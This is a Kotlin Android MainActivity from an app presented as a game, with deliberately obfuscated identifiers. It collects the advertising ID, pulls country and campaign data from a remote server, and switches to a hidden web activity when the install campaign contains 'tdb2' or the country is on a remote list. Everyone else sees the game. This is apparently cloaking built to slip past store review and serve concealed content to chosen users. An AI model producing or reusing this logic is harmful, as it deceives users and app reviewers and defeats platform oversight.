package com.king.knightsra


import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import androidx.activity.viewModels
import androidx.lifecycle.lifecycleScope
import com.appsflyer.AppsFlyerLib

import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.king.knightsra.constans.ConstanceAppClass
import com.king.knightsra.constans.ConstanceAppClass.woeijsd
import com.king.knightsra.constans.ConstanceAppClass.sjdijidas
import com.king.knightsra.constans.ConstanceAppClass.judiiofkfd
import com.king.knightsra.constans.ConstanceAppClass.vicvjjicv
import com.king.knightsra.constans.ConstanceAppClass.aqpaosk
import com.king.knightsra.databinding.ActivityMainBinding
import com.king.knightsra.game.Game
import com.king.knightsra.viewmodel.RaptorViewModel
import com.king.knightsra.web.Nheisuhd
import com.orhanobut.hawk.Hawk
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.*
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit


@AndroidEntryPoint
class MainActivity : AppCompatActivity() {
    var covcjicvixj: String? = ""
    var psosdlskd: String = ""
    var cijijcxvij: String = ""
    var wiqokod: String? = ""
    var ssiijsdjds: String? = ""
    var retroData: String? = ""
    private val rokskod: RaptorViewModel by viewModels()
    lateinit var cijvjixcv: ActivityMainBinding


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        cijvjixcv = ActivityMainBinding.inflate(layoutInflater)
        setContentView(cijvjixcv.root)
        lifecycleScope.launch {
            rokskod.eijsjdai(this@MainActivity)
            AppsFlyerLib.getInstance()
                .init(ConstanceAppClass.vokcvkvcok, rokskod.eijsdjidsji, applicationContext)
            AppsFlyerLib.getInstance().start(this@MainActivity)
        }
        networkJob()

    }

    private fun ijjsidjisd() {
        val vicvjijic = AdvertisingIdClient(applicationContext)
        vicvjijic.start()
        val psosdlsksd = vicvjijic.info.id
        Log.d("getAdvertisingId = ", psosdlsksd.toString())
        Hawk.put(judiiofkfd, psosdlsksd)
    }

    private fun checker() {
        lifecycleScope.launch(Dispatchers.IO) {
            val appsCh = Hawk.get(vicvjjicv, "null")
            var naming: String? = Hawk.get(woeijsd)
            val deeplink: String? = Hawk.get(sjdijidas, "null")
            Log.d("CountryPool", psosdlskd)
            Log.d("CountryCode", cijijcxvij)
            val wsowslxoc = Executors.newSingleThreadScheduledExecutor()
            ijjsidjisd()
            if (appsCh == "1") {
                wsowslxoc.scheduleAtFixedRate({
                    if (naming != null) {
                        if (naming!!.contains("tdb2") || psosdlskd.contains(cijijcxvij) || deeplink!!.contains(
                                "tdb2"
                            )
                        ) {

                            wsowslxoc.shutdown()
                            startActivity(
                                Intent(
                                    this@MainActivity,
                                    Nheisuhd::class.java
                                )
                            )
                            finish()


                        } else {
                            wsowslxoc.shutdown()
                            startActivity(Intent(this@MainActivity, Game::class.java))
                            finish()
                        }
                    } else {
                        naming = Hawk.get(woeijsd)
                        Log.d("Apps Checker", "naming: ${naming}")
                    }
                }, 0, 2, TimeUnit.SECONDS)
            } else if (psosdlskd.contains(cijijcxvij)) {
                startActivity(Intent(this@MainActivity, Nheisuhd::class.java))
                finish()


            } else {
                startActivity(Intent(this@MainActivity, Game::class.java))
                finish()


            }

        }
    }


    private fun networkJob() {
        rokskod.rtosokdahjsdhua()
        rokskod.countryCodeJS.observe(this, {
            Log.d("Data", "countryCode: $covcjicvixj ")
            covcjicvixj = it.body()?.qowisdj
            cijijcxvij = covcjicvixj.toString()
            rokskod.vicjvvchubh()
            rokskod.geoDev.observe(this, {
                wiqokod = it.body()?.bokbvb
                Log.d("Data", "getDataDev: $wiqokod")
                ssiijsdjds = it.body()?.roidsufh
                Hawk.put(vicvjjicv, ssiijsdjds)
                Hawk.put(aqpaosk, wiqokod)
                Log.d("Data in Hawk", "getDataDev: ${Hawk.get(aqpaosk, "null")}")
                Log.d("Data in Hawk", "getDataDev: ${Hawk.get(vicvjjicv, "null")}")
                retroData = it.body()?.wosod

                psosdlskd = retroData.toString()
                Log.d("DataGeo", retroData.toString())
                checker()
            })

        })


    }



}